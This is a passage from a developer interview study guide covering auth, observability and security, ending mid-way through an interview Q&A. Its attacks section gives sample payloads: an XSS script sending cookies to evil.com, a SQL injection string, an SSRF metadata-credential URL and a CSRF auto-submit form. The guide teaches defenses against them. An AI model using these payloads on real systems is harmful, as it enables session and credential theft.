5. Your server exchanges code for tokens:
   POST https://oauth2.googleapis.com/token
   { code, client_id, client_secret, redirect_uri }

6. Google returns:
   { access_token, refresh_token, expires_in }

7. Your app calls Google API:
   GET https://www.googleapis.com/userinfo/v2/me
   Authorization: Bearer ACCESS_TOKEN

8. Google returns user's profile data
```

**Why the code exchange in step 5?** The authorization code is short-lived and single-use. The actual token exchange happens server-to-server (not in the browser), so the access token never appears in browser history or URLs.

#### PKCE (Proof Key for Code Exchange)

Extension for mobile and SPA apps (where client_secret can't be stored securely).

```
1. App generates random code_verifier
2. App computes code_challenge = SHA256(code_verifier)
3. App sends code_challenge with auth request
4. Auth server stores code_challenge
5. App exchanges code + code_verifier (not client_secret)
6. Auth server verifies: SHA256(code_verifier) == stored code_challenge ✅
```

---

### RBAC — Role-Based Access Control

> **Definition:** RBAC is an authorization model where permissions are not assigned directly to users, but to **roles**. Users are assigned roles, and inherit the permissions of those roles.

#### RBAC Model

```
User ──belongs to──▶ Role ──has──▶ Permissions
                                    (resources + actions)

Alice ──▶ ADMIN  ──▶ { read:users, write:users, delete:users }
Bob   ──▶ EDITOR ──▶ { read:users, write:users }
Carol ──▶ VIEWER ──▶ { read:users }
```

#### Hierarchy of RBAC Concepts

```
Permission: read:invoice (action on resource)
Role:       ACCOUNTANT = [read:invoice, create:invoice]
User:       Alice = [ACCOUNTANT, VIEWER]
```

**Spring Boot RBAC example:**
```java
// Endpoint-level authorization
@PreAuthorize("hasRole('ADMIN')")
@DeleteMapping("/users/{id}")
public void deleteUser(@PathVariable String id) { ... }

@PreAuthorize("hasAnyRole('ADMIN', 'EDITOR')")
@PutMapping("/users/{id}")
public void updateUser(@PathVariable String id, @RequestBody UserDTO dto) { ... }

// Security config
http.authorizeHttpRequests(auth -> auth
    .requestMatchers("/admin/**").hasRole("ADMIN")
    .requestMatchers("/api/**").hasAnyRole("ADMIN", "USER")
    .requestMatchers("/public/**").permitAll()
);
```

#### RBAC vs ABAC

| Feature | RBAC | ABAC (Attribute-Based) |
|---|---|---|
| Based on | Roles | Attributes (user, resource, environment) |
| Example | "Only ADMINs can delete" | "Users can only edit their own posts, before 5pm, from office IP" |
| Complexity | Simple | Complex but powerful |
| Flexibility | Lower | Higher |
| Use when | Clear role hierarchy | Fine-grained, context-dependent access |

---

### Multi-Tenant Authentication

> **Definition:** Multi-tenancy is an architecture where a single software instance serves multiple customers (tenants), with strict isolation between their data, configurations, and user management.

#### Tenant Isolation Models

| Model | How | Isolation Level | Cost |
|---|---|---|---|
| **Separate DB per tenant** | Each tenant has their own database | Strongest | Highest |
| **Separate schema per tenant** | One DB, separate schemas | Strong | Medium |
| **Shared DB, tenant column** | One DB, one schema, `tenant_id` column everywhere | Weakest | Lowest |

#### JWT with Multi-Tenancy

```json
{
  "sub": "user-123",
  "tenant_id": "acme-corp",
  "role": "ADMIN",
  "exp": 1700003600
}
```

Every API request carries the `tenant_id`. All DB queries filter by it:
```java
// Automatically apply tenant filter to all queries
@Repository
public class OrderRepository {
    public List<Order> findOrders() {
        String tenantId = TenantContext.getCurrentTenant();
        return em.createQuery(
            "SELECT o FROM Order o WHERE o.tenantId = :tid", Order.class)
            .setParameter("tid", tenantId)
            .getResultList();
    }
}
```

**Tenant resolution strategies:**
- Subdomain: `acme.yourapp.com` → tenant = "acme"
- Path: `/api/acme/orders` → tenant = "acme"
- Header: `X-Tenant-ID: acme`
- JWT claim: `tenant_id` in the token payload

---

## Day 20 — Observability & Reliability

> **Theme:** You can't fix what you can't see. Observability is how you see inside your system.

---

### The Three Pillars of Observability

> **Definition:** Observability is the ability to understand the internal state of a system by examining its external outputs — specifically logs, metrics, and traces. A system is "observable" when you can answer "what is wrong and why" without deploying new code.

```
                    OBSERVABILITY
                         │
         ┌───────────────┼───────────────┐
         ▼               ▼               ▼
       LOGS           METRICS         TRACES
   "What happened"  "How much/fast"  "Where did it go"
   Text records      Numbers/counters  Request path
```

---

### Logging ⭐

> **Definition:** A log is an immutable, timestamped record of a discrete event that happened in an application — an error, a user action, a request received, a background job completed.

#### Structured vs Unstructured Logging

```
# Unstructured (hard to search/parse):
2024-01-15 10:23:45 ERROR Failed to process payment for user 123, amount 1500

# Structured JSON (searchable, filterable):
{
  "timestamp": "2024-01-15T10:23:45Z",
  "level": "ERROR",
  "service": "payment-service",
  "trace_id": "abc-123-xyz",
  "user_id": "123",
  "amount": 1500,
  "error": "InsufficientFundsException",
  "message": "Failed to process payment"
}
```

**Always use structured logging in production.** Log aggregation tools (ELK, CloudWatch) can index and query JSON fields.

#### Log Levels — When to Use Each

| Level | When to Use | Example |
|---|---|---|
| **ERROR** | Something failed; requires immediate attention | Payment processing failed |
| **WARN** | Unexpected situation but system still works | Retry #2 for external API call |
| **INFO** | Normal events worth knowing about | Order placed, service started |
| **DEBUG** | Detailed diagnostic info (dev/troubleshooting only) | SQL query executed |
| **TRACE** | Very fine-grained (rarely used in production) | Method entry/exit |

```java
// Spring Boot / Logback structured logging
private static final Logger log = LoggerFactory.getLogger(PaymentService.class);

public PaymentResult processPayment(PaymentRequest request) {
    log.info("Processing payment",
        StructuredArguments.keyValue("orderId", request.getOrderId()),
        StructuredArguments.keyValue("amount", request.getAmount()));
    try {
        PaymentResult result = gateway.charge(request);
        log.info("Payment successful",
            StructuredArguments.keyValue("transactionId", result.getTransactionId()));
        return result;
    } catch (PaymentException e) {
        log.error("Payment failed",
            StructuredArguments.keyValue("orderId", request.getOrderId()),
            StructuredArguments.keyValue("error", e.getMessage()));
        throw e;
    }
}
```

#### ELK Stack (Elasticsearch, Logstash, Kibana)

```
App Logs ──▶ Logstash (collect/parse) ──▶ Elasticsearch (index/store) ──▶ Kibana (visualize)
```

---

### Metrics ⭐

> **Definition:** A metric is a numeric measurement of a system property, collected at regular intervals over time. Metrics answer "how much" and "how fast" questions — request rate, error rate, latency, CPU usage, queue depth.

#### The Four Golden Signals (Google SRE)

| Signal | Definition | Example |
|---|---|---|
| **Latency** | Time to serve a request | p99 API response time < 200ms |
| **Traffic** | Request rate | 12,000 requests/sec |
| **Errors** | Rate of failed requests | Error rate < 0.1% |
| **Saturation** | How "full" is your system | CPU at 80%, queue depth at 10K |

#### Metric Types

| Type | Definition | Use Case |
|---|---|---|
| **Counter** | Always increasing; reset on restart | Total requests served, total errors |
| **Gauge** | Can go up or down; current value | Current active connections, memory used |
| **Histogram** | Distribution of values; calculates percentiles | Request latency (p50, p95, p99) |
| **Summary** | Like histogram but pre-computed percentiles | Similar to histogram; less flexible |

#### Percentiles vs Averages

```
Request latencies (ms): [10, 12, 11, 9, 13, 10, 11, 12, 500, 12]

Average: (10+12+11+9+13+10+11+12+500+12) / 10 = 60ms
p50 (median): 11.5ms
p95: ~500ms
p99: ~500ms

Average is misleading! The one slow request (500ms) is experienced by real users.
Use percentiles — especially p95 and p99 — for latency SLOs.
```

---

### Prometheus & Grafana

> **Prometheus:** An open-source metrics collection and alerting system. It scrapes metrics from services at regular intervals, stores them as time-series data, and evaluates alert rules.

> **Grafana:** A visualization tool that connects to Prometheus (and other data sources) to display metrics as dashboards, graphs, and alerts.

#### How Prometheus Works

```
Services expose metrics at /actuator/prometheus (Spring Boot)

Prometheus ──▶ Scrapes every 15s ──▶ Stores time-series data
                                            │
                                   Alert Manager (if rule fires)
                                            │
                                    PagerDuty / Slack
```

**Spring Boot + Prometheus:**
```xml
<!-- pom.xml -->
<dependency>
    <groupId>io.micrometer</groupId>
    <artifactId>micrometer-registry-prometheus</artifactId>
</dependency>
```

```yaml
# application.yml
management:
  endpoints:
    web:
      exposure:
        include: prometheus, health, info
  metrics:
    export:
      prometheus:
        enabled: true
```

```java
// Custom metrics
@Service
public class PaymentService {
    private final Counter paymentCounter;
    private final Timer paymentLatency;

    public PaymentService(MeterRegistry registry) {
        this.paymentCounter = Counter.builder("payments.total")
            .tag("status", "success")
            .register(registry);
        this.paymentLatency = Timer.builder("payments.latency")
            .register(registry);
    }

    public void processPayment(PaymentRequest req) {
        paymentLatency.record(() -> {
            // process payment
            paymentCounter.increment();
        });
    }
}
```

**PromQL (Prometheus Query Language) examples:**
```promql
# Request rate over last 5 minutes
rate(http_requests_total[5m])

# Error rate percentage
rate(http_requests_total{status="500"}[5m]) / rate(http_requests_total[5m]) * 100

# 95th percentile latency
histogram_quantile(0.95, rate(http_request_duration_seconds_bucket[5m]))
```

---

### Distributed Tracing ⭐

> **Definition:** Distributed tracing tracks a single request as it flows through multiple services in a distributed system. Each service adds a "span" to the trace, forming a complete picture of where time was spent and where errors occurred.

#### Why Tracing Is Essential in Microservices

```
Without tracing:
  User reports: "checkout is slow"
  You check: Order Service logs OK, Payment Service logs OK, Inventory OK
  You have no idea which service is the bottleneck ❌

With tracing:
  trace_id: abc-123
  ├── Order Service       [5ms]
  ├── Payment Service     [2ms]
  ├── Inventory Service   [1,450ms] ← HERE is your bottleneck ✅
  └── Notification Service [3ms]
```

#### Trace Structure

```
Trace: abc-123 (entire request journey)
├── Span 1: API Gateway    start: 0ms    duration: 2ms
├── Span 2: Order Service  start: 2ms    duration: 10ms
│   ├── Span 3: DB query   start: 3ms    duration: 5ms
├── Span 4: Payment Service start: 12ms  duration: 1450ms  ← slow!
└── Span 5: Notification    start: 1462ms duration: 5ms

Total: 1467ms
```

#### OpenTelemetry (Industry Standard)

OpenTelemetry is the standard API for collecting traces, metrics, and logs across languages and vendors.

```java
// Spring Boot with OpenTelemetry
// Add dependency: spring-boot-starter-actuator + micrometer-tracing

// Trace context automatically propagated via HTTP headers:
// traceparent: 00-4bf92f3577b34da6a3ce929d0e0e4736-00f067aa0ba902b7-01

@RestController
public class OrderController {
    private final Tracer tracer;

    @PostMapping("/orders")
    public Order createOrder(@RequestBody OrderRequest req) {
        Span span = tracer.nextSpan().name("create-order").start();
        try (Tracer.SpanInScope scope = tracer.withSpan(span)) {
            span.tag("userId", req.getUserId());
            return orderService.create(req);
        } finally {
            span.end();
        }
    }
}
```

**Tracing backends:** Jaeger, Zipkin, AWS X-Ray, Datadog APM

---

### SLI, SLO, SLA — Reliability Definitions

| Term | Definition | Example |
|---|---|---|
| **SLI** (Service Level Indicator) | The metric you measure | 99.5% of requests succeed |
| **SLO** (Service Level Objective) | Your internal target | 99.9% success rate |
| **SLA** (Service Level Agreement) | Contractual commitment to customers | 99.95% uptime or refund |
| **Error Budget** | How much unreliability you can afford | 0.1% of requests can fail = 43 min/month downtime |

```
SLO: 99.9% availability
Error Budget: 0.1% = 43.8 minutes of downtime per month

If you've used 35 min of your error budget this month:
  → You have 8.8 min left
  → Be careful deploying risky changes
  → This week, focus on reliability over features
```

---

## Day 21 — Security

> **Theme:** Security is not a feature you add at the end. It is designed in from the start.

---

### TLS — Transport Layer Security

> **Definition:** TLS (Transport Layer Security) is a cryptographic protocol that provides privacy and data integrity between two communicating applications over a network. It is the "S" in HTTPS.

#### What TLS Provides

| Property | Meaning |
|---|---|
| **Confidentiality** | Data is encrypted in transit — eavesdroppers see only ciphertext |
| **Integrity** | Data cannot be tampered with in transit without detection |
| **Authentication** | Server identity is verified via certificate (prevents impersonation) |

#### TLS Handshake (Simplified)

```
Client                              Server
  │                                   │
  │── ClientHello (TLS version, ciphers)──▶│
  │                                   │
  │◀── ServerHello + Certificate ─────│
  │    (server's public key, signed by CA)  │
  │                                   │
  │ Client verifies certificate        │
  │ (is it signed by trusted CA?)     │
  │                                   │
  │── Key Exchange ──────────────────▶│
  │   (establish shared session key)  │
  │                                   │
  │◀────── Encrypted communication ───│
```

**TLS 1.3 improvements over 1.2:**
- Fewer round trips (0-RTT for resumption)
- Removed weak cipher suites
- Forward secrecy required

#### mTLS — Mutual TLS

In standard TLS, only the **server** is authenticated. In mTLS, **both** client and server present certificates.

```
Standard TLS:  Client → verifies Server certificate
mTLS:          Client → verifies Server certificate
               Server → verifies Client certificate
```

**Use case:** Service-to-service authentication in microservices. Each service has a certificate; only authenticated services can communicate. Used heavily in service meshes (Istio).

---

### Encryption

> **Definition:** Encryption is the process of converting plaintext data into an unreadable format (ciphertext) using an algorithm and a key, such that only authorized parties with the correct key can decrypt it.

#### Symmetric vs Asymmetric Encryption

| Type | How | Key | Use Case |
|---|---|---|---|
| **Symmetric** | Same key encrypts and decrypts | One shared key | Data encryption at rest (AES-256) |
| **Asymmetric** | Public key encrypts; private key decrypts | Public/private key pair | TLS handshake, signatures, key exchange |

```
Symmetric (AES-256):
  encrypt("Hello", key) → "X7f#9@"
  decrypt("X7f#9@", key) → "Hello"
  ✅ Fast  ❌ Both parties need the same key (key exchange problem)

Asymmetric (RSA):
  encrypt("Hello", publicKey) → "X7f#9@"
  decrypt("X7f#9@", privateKey) → "Hello"
  ✅ No key exchange problem  ❌ Slow (used for small data only)
```

#### Encryption in Practice

**Encryption at rest:** Protecting stored data (database, disks, backups).
```
DB-level:  PostgreSQL Transparent Data Encryption (TDE)
File-level: AWS S3 SSE-S3 or SSE-KMS (server-side encryption)
App-level:  Encrypt specific fields before storing (credit card numbers, SSN)
```

**Encryption in transit:** Protecting data moving across a network.
```
Always use TLS (HTTPS) for all external and internal traffic
Enforce minimum TLS 1.2; prefer TLS 1.3
```

**Hashing (not encryption):** One-way — you cannot reverse it.
```java
// NEVER store plain passwords
// NEVER use MD5 or SHA1 for passwords (too fast)

// Use BCrypt, Argon2, or scrypt:
String hash = BCrypt.hashpw(password, BCrypt.gensalt(12));
boolean valid = BCrypt.checkpw(inputPassword, storedHash);
```

---

### Secrets Management

> **Definition:** Secrets management is the practice of securely storing, accessing, rotating, and auditing sensitive configuration values — API keys, database passwords, TLS certificates — so that they are never hardcoded in source code or exposed in plaintext.

#### The Problem

```
# ❌ BAD — hardcoded in code (worst practice)
String dbPassword = "MyDB@secret123";

# ❌ BAD — in application.properties (committed to git)
spring.datasource.password=MyDB@secret123

# ❌ BAD — in environment variable (readable by anyone with shell access)
export DB_PASSWORD=MyDB@secret123
```

If your code is on GitHub — your secret is public. If your server is compromised — env vars are readable.

#### Secrets Management Solutions

| Tool | Type | How It Works |
|---|---|---|
| **HashiCorp Vault** | Self-hosted | Centralized secrets store; dynamic secrets; audit log |
| **AWS Secrets Manager** | Managed | Store secrets; auto-rotation; IAM-based access |
| **AWS Parameter Store** | Managed | Simpler; cheaper; good for non-sensitive config too |
| **GCP Secret Manager** | Managed | Similar to AWS Secrets Manager |
| **Kubernetes Secrets** | Built-in | Base64 encoded (not encrypted by default!); needs etcd encryption |

**Spring Boot + AWS Secrets Manager:**
```java
// No password in code or config files
// Spring Cloud AWS reads from Secrets Manager at startup

spring:
  config:
    import: "aws-secretsmanager:/myapp/prod/db"
```

**Secret rotation:** Secrets should be rotated periodically (monthly or quarterly) or immediately after a suspected breach. Vault and AWS Secrets Manager support automatic rotation.

---

### Common Attacks and Defenses

#### SQL Injection

> **Definition:** An attack where malicious SQL code is inserted into input fields, causing the database to execute unintended commands.

```java
// ❌ VULNERABLE — string concatenation
String query = "SELECT * FROM users WHERE email = '" + email + "'";
// Input: ' OR '1'='1
// Query becomes: SELECT * FROM users WHERE email = '' OR '1'='1'
// Returns ALL users ❌

// ✅ SAFE — parameterized query
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE email = ?"
);
stmt.setString(1, email);
```

**Defense:** Always use parameterized queries / prepared statements. Never concatenate user input into SQL.

#### XSS — Cross-Site Scripting

> **Definition:** An attack where malicious scripts are injected into web pages viewed by other users, stealing cookies, session tokens, or performing actions on their behalf.

```html
<!-- ❌ Stored XSS: user submits this comment -->
<script>document.location='https://evil.com?cookie='+document.cookie</script>

<!-- When rendered for other users, the script runs and steals cookies -->
```

**Defenses:**
- Encode/escape all user-supplied output (HTML entities)
- Use Content Security Policy (CSP) headers
- Use `httpOnly` cookies (JavaScript cannot read them)
- Use frameworks that auto-escape (React, Thymeleaf)

#### CSRF — Cross-Site Request Forgery

> **Definition:** An attack that tricks an authenticated user into unknowingly submitting a request to a web application they're authenticated to, causing unintended actions.

```
1. User is logged into bank.com (session cookie exists)
2. User visits evil.com
3. evil.com has hidden form:
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="attacker">
     <input name="amount" value="10000">
   </form>
   <script>document.forms[0].submit()</script>
4. Browser sends POST to bank.com WITH the session cookie
5. Bank thinks this is a legitimate request ❌
```

**Defenses:**
- CSRF tokens (unique token per session, submitted with every form)
- `SameSite=Strict` or `SameSite=Lax` cookie attribute
- Check `Origin` / `Referer` headers

#### SSRF — Server-Side Request Forgery

> **Definition:** An attack where an attacker causes the server to make HTTP requests to an unintended destination — often internal services or cloud metadata endpoints.

```
Attacker submits: https://internal-db.company.com:5432
Or: http://169.254.169.254/latest/meta-data/iam/security-credentials/

Server fetches this URL and returns the result to the attacker
→ Attacker can access internal services or AWS credentials ❌
```

**Defenses:**
- Validate and allowlist URLs before fetching
- Block access to private IP ranges (10.x.x.x, 192.168.x.x, 169.254.x.x)
- Run fetch operations in isolated network segments

#### DDoS — Distributed Denial of Service

> **Definition:** An attack that overwhelms a service with traffic from many sources (often a botnet), making it unavailable to legitimate users.

**Defenses:**
- Rate limiting (per IP, per user, per API key)
- CDN and DDoS protection (Cloudflare, AWS Shield)
- Auto-scaling to absorb traffic spikes
- CAPTCHA for high-risk endpoints
- IP blocking / geo-blocking

---

### Security Headers Cheat Sheet

```http
# Prevent XSS
Content-Security-Policy: default-src 'self'

# Prevent MIME type sniffing
X-Content-Type-Options: nosniff

# Prevent clickjacking
X-Frame-Options: DENY

# Force HTTPS
Strict-Transport-Security: max-age=31536000; includeSubDomains

# Referrer policy
Referrer-Policy: strict-origin-when-cross-origin

# Prevent FLoC (Google tracking)
Permissions-Policy: interest-cohort=()
```

**Spring Boot security headers:**
```java
http.headers(headers -> headers
    .contentSecurityPolicy("default-src 'self'")
    .frameOptions(frame -> frame.deny())
    .httpStrictTransportSecurity(hsts -> hsts
        .maxAgeInSeconds(31536000)
        .includeSubDomains(true))
);
```

---

## Interview Q&A

> 40 questions covering all Phase 3 topics, calibrated for 1–6 YOE developers.

---

### Distributed Systems Core

**Q1. What is the difference between synchronous and asynchronous replication?**
> Synchronous replication waits for at least one follower to confirm the write before acknowledging the client. This ensures no data loss but increases write latency and makes the leader sensitive to follower performance. Asynchronous replication acknowledges immediately and replicates in the background. Writes are faster but a leader crash before replication can lose recent data. Most production systems use semi-synchronous — at least one replica confirms, the rest are async.

**Q2. What is split-brain in a distributed system and how do you prevent it?**
> Split-brain occurs when two nodes both believe they are the leader simultaneously — typically after a network partition. Both accept writes, causing conflicting data. Prevent it with: quorum-based leader election (leader requires majority vote — minority side cannot elect a leader), STONITH (forcibly shut down the old leader), or fencing tokens (only the node with the current epoch token can write to shared storage).

**Q3. Explain quorum reads and writes. With N=3, W=2, R=2 — can you always get the latest data?**
> With W=2, R=2, W+R=4 > N=3, so any read quorum overlaps with any write quorum by at least one node. That overlapping node must have the latest write, so the reader can compare responses and return the most recent value. Yes — you will always see the latest committed write. The trade-off is that both reads and writes are slower than W=1, R=1.

**Q4. What happens during a network partition in a Cassandra cluster (AP system)?**
> Cassandra continues accepting reads and writes on all sides of the partition. Nodes on the minority side serve requests with potentially stale data. When the partition heals, Cassandra reconciles diverged data using a "last write wins" strategy based on timestamps, read repair, and anti-entropy background sync. Some data written during the partition may be overwritten by conflicting writes from the other side.

**Q5. What is the Raft consensus algorithm used for?**
> Raft provides distributed consensus — ensuring all nodes agree on a sequence of operations. It's used for leader election in distributed systems, distributed log replication, and configuration management. It's the foundation of etcd (Kubernetes config store), Consul, CockroachDB, and TiKV. In Raft, a leader is elected by majority vote, and all writes go through the leader, which replicates to followers before committing.

---

### Messaging & Async Systems

**Q6. What is the key difference between Kafka and RabbitMQ?**
> Kafka is an event streaming platform with an immutable, replayable log. Messages are retained for a configurable period and can be consumed by multiple independent consumer groups simultaneously. RabbitMQ is a message broker — messages are delivered and deleted after acknowledgment. Use Kafka for event sourcing, audit logs, and streaming pipelines. Use RabbitMQ for task queues, RPC patterns, and complex routing with immediate consumption.

**Q7. What does "at-least-once delivery" mean and how do you handle it?**
> At-least-once means a message is guaranteed to be delivered, but may be delivered more than once on retries or consumer restarts. Your consumer must be idempotent — processing the same message twice produces the same result as processing it once. Implement this with: checking if the message ID has already been processed before acting, using database upserts instead of inserts, or making operations naturally idempotent (like setting a value rather than incrementing it).

**Q8. What is a partition key in Kafka and why does it matter?**
> The partition key determines which partition a message is written to. Messages with the same key always go to the same partition. This matters for ordering — Kafka only guarantees message order within a partition. For example, using `order_id` as the partition key ensures all events for a specific order (created, updated, shipped) arrive at the consumer in the correct order.

**Q9. What is a Dead Letter Queue and when would you use it?**
> A DLQ is where messages go after they've failed processing beyond the maximum retry count. Instead of blocking the main queue with a poison message, the bad message is moved to the DLQ for investigation. I'd use it whenever I have a consumer that can fail — which is always. Then I'd set up an alert on DLQ depth, build a redrive mechanism to replay fixed messages, and analyze DLQ contents to find root causes.

**Q10. How does SQS handle a consumer that crashes mid-processing?**
> SQS uses a visibility timeout. When a consumer receives a message, it becomes invisible to all other consumers. If the consumer doesn't explicitly delete the message within the visibility timeout (e.g., 30 seconds), SQS makes the message visible again and another consumer picks it up. This is at-least-once delivery — the consumer must be idempotent to handle potential duplicate processing.

**Q11. When would you use Pub-Sub over a point-to-point queue?**
> Use Pub-Sub when multiple independent services need to react to the same event. For example, when an order is placed, both the payment service AND inventory service AND notification service all need to know — Pub-Sub fans the event out to all subscribers without the publisher knowing who they are. Use point-to-point queues when you want work distributed among consumers for load sharing — only one consumer should process each task.

---

### Architecture Styles

**Q12. What are the main differences between a monolith and a modular monolith?**
> A plain monolith has no internal structure — all code is entangled. A modular monolith is the same single deployable artifact but organized into clearly bounded modules with explicit interfaces. Modules can only communicate through their public APIs, never accessing each other's internals directly. The key benefit: it gives you the operational simplicity of a monolith while building the domain boundaries that make future microservice extraction much less painful.

**Q13. When should you NOT use microservices?**
> When you're early-stage and still discovering your domain boundaries — premature decomposition leads to the wrong boundaries, which are very costly to fix. When your team is small — microservices require significant operational capability (monitoring, CI/CD, container orchestration). When you don't have a latency or scaling problem that microservices would actually solve. Starting with a well-structured monolith or modular monolith is almost always the right choice.

**Q14. What is Conway's Law and how does it apply to microservices?**
> Conway's Law states that systems designed by organizations mirror their communication structure. In practice, microservice boundaries should align with team boundaries. A payment team should own the payment service. If team boundaries and service boundaries don't match, you get chattiness between services owned by different teams — coordination overhead kills productivity. Good microservice architecture is as much an organizational design as a technical one.

**Q15. What is a cold start in serverless and how do you mitigate it?**
> A cold start occurs when a serverless function is invoked for the first time (or after a period of inactivity) and the cloud provider must initialize a new container — pulling the image, starting the runtime, loading dependencies. This adds 100ms to 2 seconds of latency. Mitigate with: provisioned concurrency (keep N instances warm always), minimizing dependencies to reduce init time, using lighter runtimes (Go, Node.js start faster than Java), or keeping functions warm with scheduled pings.

---

### Microservices Patterns

**Q16. What does an API Gateway do and why is it important in microservices?**
> An API Gateway is the single entry point for all client traffic. It handles cross-cutting concerns that every service would otherwise need to implement independently: authentication, rate limiting, SSL termination, routing, logging, and sometimes response aggregation. Without it, every microservice must duplicate these concerns — inconsistently. It also hides the internal service topology from clients, so you can refactor services without changing client URLs.

**Q17. What is the difference between client-side and server-side service discovery?**
> In client-side discovery, the client queries the service registry directly, receives a list of healthy instances, and picks one (applying its own load balancing). Libraries like Ribbon implement this. In server-side discovery, the client calls a load balancer or proxy; the load balancer queries the registry and routes the call. Kubernetes Services use server-side discovery — the client just calls `payment-service` and Kubernetes handles routing. Server-side is simpler for clients; client-side gives more control.

**Q18. Why is "database per service" important in microservices?**
> Without it, services are coupled at the data layer — one team's schema change breaks another team's service. With a database per service, each team owns and evolves their schema independently. The trade-off is that joins across services are no longer possible — you must use API composition or CQRS read models. And you must handle distributed consistency with patterns like Saga instead of ACID transactions.

**Q19. What is the Sidecar pattern and how does a service mesh use it?**
> The Sidecar pattern deploys a helper container alongside the main application in the same pod. The sidecar handles infrastructure concerns without the app knowing about them. A service mesh like Istio deploys an Envoy proxy sidecar next to every service. All inbound and outbound traffic flows through this proxy — enabling automatic mTLS between services, traffic management, distributed tracing, and circuit breaking, all without any application code changes.

---

### Authentication & Authorization

**Q20. What are the three parts of a JWT and what does each contain?**
> Header: algorithm used to sign the token (e.g., HS256). Payload: the claims — user ID, roles, expiry time (exp), issued-at time (iat). Signature: cryptographic signature of header+payload using the server's secret key — proves the token hasn't been tampered with. Critical: the payload is only Base64 encoded, NOT encrypted. Never put sensitive data (passwords, full credit card numbers) in a JWT payload.

**Q21. What is the difference between a JWT access token and a refresh token?**
> Access tokens are short-lived (15 min – 1 hour) and sent with every API request. If stolen, the attacker has only a short window. Refresh tokens are long-lived (days to weeks) and used only to obtain new access tokens when the access token expires. They're stored in httpOnly cookies (JavaScript cannot read them) and can be invalidated server-side. This combination gives security (short-lived access) with usability (auto-refresh instead of re-login).

**Q22. Walk me through the OAuth 2.0 Authorization Code flow.**
> User clicks "Login with Google." App redirects to Google's authorization endpoint with client_id, redirect_uri, and requested scopes. User authenticates with Google and grants consent. Google redirects back with a short-lived authorization code. Your server exchanges this code for access and refresh tokens via a server-to-server call (using client_secret). Your server stores the tokens and uses the access token to call Google APIs. The code-exchange step is server-to-server to keep the access token out of the browser URL and history.

**Q23. What is PKCE and why is it needed?**
> PKCE (Proof Key for Code Exchange) is an OAuth extension for clients that cannot securely store a client_secret — mobile apps and single-page applications. Without PKCE, an attacker who intercepts the authorization code could exchange it for tokens. With PKCE, the client generates a random `code_verifier`, sends its hash (`code_challenge`) with the auth request, then proves it knows the original verifier during the token exchange. The auth server verifies the hash matches — only the original client can exchange the code.

**Q24. Explain RBAC. How would you implement it in Spring Boot?**
> RBAC assigns permissions to roles, and roles to users — rather than assigning permissions directly to each user. In Spring Boot, I'd define roles (ADMIN, EDITOR, VIEWER), assign them in the JWT claims or database, and enforce them with `@PreAuthorize("hasRole('ADMIN')")` on endpoints, or with `HttpSecurity` config mapping URL patterns to roles. For finer control, Spring Security supports method-level security with SpEL expressions.

**Q25. How does multi-tenancy affect JWT token design?**
> Include a `tenant_id` claim in the JWT payload. Every authenticated request carries the tenant context. Services extract this claim and apply it as a filter on all data queries. The key is ensuring a user from Tenant A can never access Tenant B's data — even if they have the same user ID. All DB queries must include `WHERE tenant_id = ?`. I'd use a ThreadLocal or request-scoped bean to propagate the tenant context through the call stack automatically.

---

### Observability & Reliability

**Q26. What are the three pillars of observability? How do they differ?**
> Logs, metrics, and traces. Logs are timestamped records of discrete events — ideal for understanding what happened and debugging specific incidents. Metrics are numeric time-series measurements — ideal for dashboards, trending, and alerting on thresholds (error rate, latency). Traces follow a request across services — ideal for finding where latency or errors occur in a distributed call chain. You need all three: metrics tell you something is wrong, traces tell you where, and logs tell you why.

**Q27. Why should you use percentiles (p95, p99) instead of averages for latency metrics?**
> Averages hide the tail. If 99 requests take 10ms and 1 takes 5000ms, the average is 60ms — looks fine. But real users experience the 5000ms request. p99 latency tells you "99% of requests complete within X ms" — which directly represents user experience. SLOs are typically defined on p95 or p99, not averages. The users who experience tail latency are often the most important (high-value customers with complex data).

**Q28. What is a trace and how is trace context propagated across services?**
> A trace represents the complete journey of a single request through multiple services. Each service creates a span for its portion of work and records start time, end time, and any errors. The trace context (trace ID + parent span ID) is propagated via HTTP headers — `traceparent` in the W3C standard or `X-B3-TraceId` in Zipkin format. When Service A calls Service B, it includes these headers; Service B creates a child span linked to Service A's span. Tools like Jaeger render this as a timeline.

**Q29. What is the difference between SLI, SLO, and SLA?**
> SLI (Service Level Indicator) is the actual measured metric — "99.5% of requests succeed." SLO (Service Level Objective) is your internal target for that metric — "We aim for 99.9% success rate." SLA (Service Level Agreement) is the contractual commitment to customers — "We guarantee 99.95% availability or we provide credits." The error budget is derived from the SLO: 0.1% of requests can fail. Burning through the error budget faster than normal is a signal to freeze risky deployments and focus on reliability.

**Q30. What are the Four Golden Signals?**
> Latency (how long requests take — track p95 and p99), Traffic (request rate — how much load), Errors (rate of failed requests — 5xx errors), and Saturation (how full the system is — CPU, memory, queue depth). These four signals, from Google's SRE book, cover what's most important to monitor for any service. If all four are healthy, the service is almost certainly healthy.

---

### Security

**Q31. What is TLS and what does it protect against?**
> TLS (Transport Layer Security) is the cryptographic protocol behind HTTPS. It provides: confidentiality (data is encrypted, eavesdroppers see only ciphertext), integrity (tampering is detected via message authentication codes), and server authentication (certificate proves you're talking to the real server, not an impostor). It protects against: man-in-the-middle attacks, eavesdropping, and data tampering in transit.

**Q32. What is the difference between encryption at rest and encryption in transit?**
> Encryption in transit: data is encrypted while moving across a network (HTTPS, TLS). Protects against network eavesdropping. Encryption at rest: data is encrypted while stored on disk, in a database, or in backups. Protects against unauthorized physical or logical access to storage. Both are needed — encrypting only in transit means a compromised DB server exposes all stored data in plaintext.

**Q33. Why should you never store passwords in plain text, and what should you use instead?**
> Plain text passwords are catastrophically exposed in any data breach. MD5 and SHA-256 are also wrong for passwords — they're fast, so attackers can try billions of combinations per second (rainbow tables, brute force). Use a slow, purpose-built password hashing algorithm: BCrypt, Argon2, or scrypt. These include a salt (prevents rainbow tables) and are computationally expensive by design (slowing attacks). BCrypt with cost factor 12 takes ~250ms to hash — trivial for login, prohibitive for attackers.

**Q34. Explain SQL injection and how to prevent it.**
> SQL injection occurs when user input is concatenated directly into a SQL query. An attacker can input SQL syntax to manipulate the query — extracting all data, bypassing authentication, or deleting tables. Prevention: always use parameterized queries or prepared statements. The database treats parameters as data, never as SQL code. ORMs like Hibernate/JPA use parameterized queries by default, but custom queries with string concatenation are still vulnerable.

**Q35. What is CSRF and how does `SameSite=Strict` prevent it?**
